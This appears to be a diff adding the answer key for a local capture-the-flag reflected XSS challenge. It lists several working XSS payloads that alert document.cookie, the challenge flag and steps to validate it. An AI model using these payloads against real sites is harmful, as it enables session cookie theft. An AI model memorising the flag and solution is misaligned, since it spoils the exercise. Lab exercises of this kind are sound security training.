@@ -1,0 +1,26 @@
+# Reflected XSS - Solution Payload
+
+## Basic XSS Payload
+http://localhost:3001/search?q=<script>alert(document.cookie)</script>
+
+## Alternative Payloads
+
+# Using img tag
+http://localhost:3001/search?q=<img src=x onerror=alert(document.cookie)>
+
+# Using svg tag
+http://localhost:3001/search?q=<svg onload=alert(document.cookie)>
+
+# Breaking out of HTML context
+http://localhost:3001/search?q="><script>alert(document.cookie)</script>
+
+## Flag
+ARENA{xss_c00k13_th3ft_FTW}
+
+## Steps to Reproduce
+1. Start the challenge: docker compose up
+2. Navigate to: http://localhost:3001
+3. Inject the payload in the search box or URL
+4. Browser executes JavaScript and displays cookie in alert
+5. Copy flag from alert: ARENA{xss_c00k13_th3ft_FTW}
+6. Validate: ./validate.sh "ARENA{xss_c00k13_th3ft_FTW}"
